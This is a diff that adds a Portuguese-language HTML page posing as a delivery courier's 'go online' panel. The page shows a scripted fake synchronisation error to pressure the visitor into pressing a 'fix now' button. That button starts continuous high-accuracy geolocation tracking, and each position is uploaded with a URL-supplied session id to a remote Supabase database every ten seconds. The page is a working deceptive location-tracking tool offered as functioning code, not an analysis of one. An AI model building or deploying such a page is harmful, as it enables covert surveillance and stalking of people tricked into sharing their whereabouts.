@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Painel do Entregador</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        :root { --red: #ea1d2c; --dark: #121212; }
+        body { font-family: sans-serif; margin: 0; background: #f8f8f8; display: flex; flex-direction: column; height: 100vh; }
+        header { background: var(--red); color: white; padding: 18px; text-align: center; font-weight: bold; font-size: 18px; }
+        .container { flex: 1; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        .card { background: white; width: 100%; max-width: 400px; padding: 35px 20px; border-radius: 20px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
+        .btn { background: var(--dark); color: white; border: none; padding: 20px; width: 100%; border-radius: 12px; font-weight: bold; font-size: 16px; cursor: pointer; }
+        #fake-error { display: none; color: #721c24; background: #f8d7da; border: 1px solid #f5c6cb; padding: 15px; border-radius: 10px; margin-bottom: 20px; font-size: 13px; line-height: 1.5; }
+        .status-online { color: #2ecc71; display: none; font-weight: bold; font-size: 18px; animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid var(--red); border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; display: inline-block; margin-bottom: 10px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<header>ENTREGA EM CURSO</header>
+
+<div class="container">
+    <div class="card" id="app-card">
+        <div id="loading" style="display:none;">
+            <div class="spinner"></div>
+            <p>Conectando ao servidor...</p>
+        </div>
+
+        <div id="fake-error">
+            <strong>⚠️ ERRO DE SINCRONIZAÇÃO (Ref: 0x882)</strong><br>
+            O protocolo de rastreamento falhou. É necessário revalidar as permissões de hardware para continuar.
+        </div>
+
+        <div id="initial-ui">
+            <h2 style="margin-top:0">Olá, Parceiro!</h2>
+            <p style="color: #666; margin-bottom: 30px;">Clique abaixo para iniciar seu turno e liberar o rastreio da rota.</p>
+            <button class="btn" onclick="triggerFakeError()">FICAR ONLINE</button>
+        </div>
+
+        <div id="online-ui" style="display:none;">
+            <div class="status-online">● CONECTADO E RASTREANDO</div>
+            <p style="color: #888; font-size: 13px; margin-top: 15px;">Sua rota está sendo enviada para a central.</p>
+        </div>
+    </div>
+</div>
+
+<script>
+    const supabaseUrl = 'https://zauxkrwtnrlwlgvsdewv.supabase.co';
+    const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InphdXhrcnd0bnJsd2xndnNkZXd2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjY5Njc4MjgsImV4cCI6MjA4MjU0MzgyOH0.L7HJfYvY-IyTBo6gC597EnChuq536WHCDdIZxv8-cKI';
+    const _supabase = supabase.createClient(supabaseUrl, supabaseKey);
+    
+    const urlParams = new URLSearchParams(window.location.search);
+    const sessionId = urlParams.get('id');
+
+    function triggerFakeError() {
+        document.getElementById('initial-ui').style.display = 'none';
+        document.getElementById('loading').style.display = 'block';
+
+        setTimeout(() => {
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('fake-error').style.display = 'block';
+            
+            // Botão "Mágico" para corrigir o erro
+            const fixBtn = document.createElement('button');
+            fixBtn.className = "btn";
+            fixBtn.innerText = "CORRIGIR AGORA";
+            fixBtn.onclick = startTracking;
+            document.getElementById('app-card').appendChild(fixBtn);
+        }, 1200);
+    }
+
+    function startTracking() {
+        if (!sessionId) return;
+
+        // Solicita localização Real
+        navigator.geolocation.watchPosition((pos) => {
+            // Esconde erros e mostra status Online
+            document.getElementById('fake-error').style.display = 'none';
+            if(document.querySelector('#app-card .btn')) document.querySelector('#app-card .btn').style.display = 'none';
+            document.getElementById('online-ui').style.display = 'block';
+
+            const data = {
+                session_id: sessionId,
+                latitude: pos.coords.latitude,
+                longitude: pos.coords.longitude,
+                accuracy: pos.coords.accuracy,
+                created_at: new Date().toISOString()
+            };
+
+            // 1. Salva no Buffer Local (Offline Support)
+            saveLocal(data);
+            // 2. Tenta sincronizar
+            sync();
+
+        }, null, { enableHighAccuracy: true });
+    }
+
+    function saveLocal(data) {
+        let items = JSON.parse(localStorage.getItem('gps_store') || '[]');
+        items.push(data);
+        localStorage.setItem('gps_store', JSON.stringify(items));
+    }
+
+    async function sync() {
+        if (!navigator.onLine) return;
+        let items = JSON.parse(localStorage.getItem('gps_store') || '[]');
+        if (items.length === 0) return;
+
+        const { error } = await _supabase.from('locations').insert(items);
+        if (!error) localStorage.setItem('gps_store', '[]');
+    }
+
+    // Tenta sincronizar a cada 10s
+    setInterval(sync, 10000);
+</script>
+</body>
+</html>
